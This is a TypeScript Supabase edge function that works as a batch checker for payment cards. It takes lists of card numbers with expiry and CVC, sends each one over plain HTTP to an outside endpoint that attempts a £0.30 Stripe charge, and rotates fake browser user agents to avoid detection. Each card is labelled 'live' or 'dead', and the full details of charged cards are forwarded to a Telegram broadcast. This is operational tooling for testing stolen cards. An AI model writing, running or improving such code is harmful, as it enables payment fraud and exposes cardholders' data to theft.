import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration - GBP endpoint
const API_BASE_URL = "http://3-production-c130.up.railway.app/api";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");

// Rotating User Agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

// Notify charged card - broadcasts to Telegram channel (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      userId,
      cardDetails,
      status,
      responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[STRIPE-GBP-BATCH] notify-charged-card error:", err));
};

// Direct API call for a single card - returns exact response
const callApi = async (cc: string): Promise<{ cc: string; status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${cc}`;
  const userAgent = getRandomItem(userAgents);
  
  console.log(`[STRIPE-GBP-BATCH] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': userAgent,
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPE-GBP-BATCH] Response for ${cc.split('|')[0]?.slice(-4) || 'card'}: ${rawText.substring(0, 200)}`);
    
    if (!rawText || rawText.trim() === '') {
      return { cc, status: 'unknown', message: 'Empty response', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = 'No response message';
    
    try {
      const json = JSON.parse(rawText);
      
      // Deep extract human-readable message from nested structures
      if (json.error?.error?.message) {
        apiMessage = json.error.error.message;
      } else if (json.error?.message) {
        apiMessage = json.error.message;
      } else if (json.message && typeof json.message === 'string') {
        apiMessage = json.message;
      } else if (json.msg && typeof json.msg === 'string') {
        apiMessage = json.msg;
      } else if (json.result?.message) {
        apiMessage = json.result.message;
      }
      
      // Detect status from response structure
      if (json.success === false || json.error || 
          json.status === 'declined' || json.status === 'DECLINED' || json.status === 'failed') {
        apiStatus = 'dead';
      }
      else if (json.success === true || json.full_response === true || 
               json.status === 'CHARGED' || json.status === 'success' || json.status === 'charged' ||
               json.status === 'succeeded') {
        apiStatus = 'live';
      }
      else {
        const lower = String(apiMessage).toLowerCase();
        if (lower.includes('declined') || lower.includes('card_declined') || 
            lower.includes('do_not_honor') || lower.includes('insufficient') || 
            lower.includes('expired') || lower.includes('invalid') || 
            lower.includes('fraud') || lower.includes('stolen') ||
            lower.includes('lost') || lower.includes('restricted') ||
            lower.includes('pickup') || lower.includes('not permitted') ||
            lower.includes('security violation') || lower.includes('exceeds')) {
          apiStatus = 'dead';
        } else if (lower.includes('success') || lower.includes('charged') || 
                   lower.includes('approved') || lower.includes('succeeded') ||
                   lower.includes('completed') || lower.includes('paid')) {
          apiStatus = 'live';
        }
      }
      
      // Also check error codes for declined
      if (json.error?.error?.code === 'card_declined' || json.error?.code === 'card_declined' ||
          json.error?.error?.type === 'card_error' || json.error?.type === 'card_error') {
        apiStatus = 'dead';
      }
      
    } catch {
      // Text response - keyword detection
      const lower = rawText.toLowerCase();
      if (lower.includes('declined') || lower.includes('error') || lower.includes('failed')) {
        apiStatus = 'dead';
        apiMessage = 'Card declined';
      } else if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
        apiMessage = 'Charged successfully';
      } else {
        apiMessage = rawText.substring(0, 200);
      }
    }
    
    return { cc, status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[STRIPE-GBP-BATCH] Error for card: ${errMsg}`);
    return { cc, status: 'unknown', message: 'Request timeout', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cards } = body;
    
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return new Response(JSON.stringify({ error: 'Cards array required', results: [] }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Limit batch size to 10
    const cardsToProcess = cards.slice(0, 10);
    console.log(`[STRIPE-GBP-BATCH] Processing ${cardsToProcess.length} cards`);

    // Validate card formats
    const validCards: string[] = [];
    const invalidResults: Array<{ cc: string; status: string; message: string }> = [];

    for (const cc of cardsToProcess) {
      const parts = cc.split('|');
      if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
        invalidResults.push({ cc, status: 'unknown', message: 'Invalid format: CardNumber|MM|YY|CVC' });
      } else {
        validCards.push(cc);
      }
    }

    // Auth check
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Process all valid cards in parallel with real-time API calls
    const apiResults = await Promise.all(validCards.map(cc => callApi(cc)));

    // Format results and notify charged cards
    const formattedResults = apiResults.map(result => {
      const formattedResult = {
        cc: result.cc,
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '£0.30',
        chargeAmount: '£0.30',
        status: result.status,
        message: result.message,
      };

      // Fire-and-forget notification for CHARGED cards
      if (result.status === 'live') {
        notifyChargedCard(
          user.id,
          result.cc,
          'CHARGED',
          result.message,
          '£0.30',
          'Stripe GBP'
        );
      }

      return formattedResult;
    });

    // Combine valid and invalid results
    const allResults = [
      ...formattedResults,
      ...invalidResults.map(r => ({
        cc: r.cc,
        computedStatus: r.status,
        apiStatus: 'UNKNOWN',
        apiMessage: r.message,
        apiTotal: '£0.30',
        chargeAmount: '£0.30',
        status: r.status,
        message: r.message,
      }))
    ];

    console.log(`[STRIPE-GBP-BATCH] Completed: ${formattedResults.filter(r => r.status === 'live').length} live, ${formattedResults.filter(r => r.status === 'dead').length} dead, ${formattedResults.filter(r => r.status === 'unknown').length + invalidResults.length} unknown`);

    return new Response(
      JSON.stringify({ results: allResults }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    console.error(`[STRIPE-GBP-BATCH] Fatal error: ${msg}`);
    return new Response(JSON.stringify({ error: msg, results: [] }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
